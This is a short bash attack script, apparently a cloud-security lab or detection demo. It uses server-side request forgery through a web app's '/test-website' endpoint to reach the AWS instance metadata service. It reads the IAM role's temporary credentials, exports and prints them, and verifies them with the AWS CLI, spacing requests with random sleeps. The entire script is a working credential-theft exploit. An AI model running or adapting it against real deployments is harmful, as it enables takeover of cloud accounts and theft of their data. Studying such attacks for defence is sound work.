#!/bin/bash
set -e

if [[ $# -ne 1 ]]; then
  echo "Usage: run-attack.sh alb-url"
  exit 1
fi

function request() {
  curl -s $url/test-website -H "Content-Type: application/json" -X POST -d "{\"url\":\"$1\"}"
  echo
}
function randomSleep() {
  sleep $((RANDOM % 4))
}

url=$1

# Recon
request "https://google.com" >/dev/null
randomSleep

request http://169.254.169.254 >/dev/null
randomSleep

roleName=$(request http://169.254.169.254/latest/meta-data/iam/security-credentials/)
randomSleep

creds=$(request http://169.254.169.254/latest/meta-data/iam/security-credentials/$roleName)
export AWS_ACCESS_KEY_ID=$(echo $creds | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $creds | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $creds | jq -r '.Token')
env | grep AWS
aws sts get-caller-identity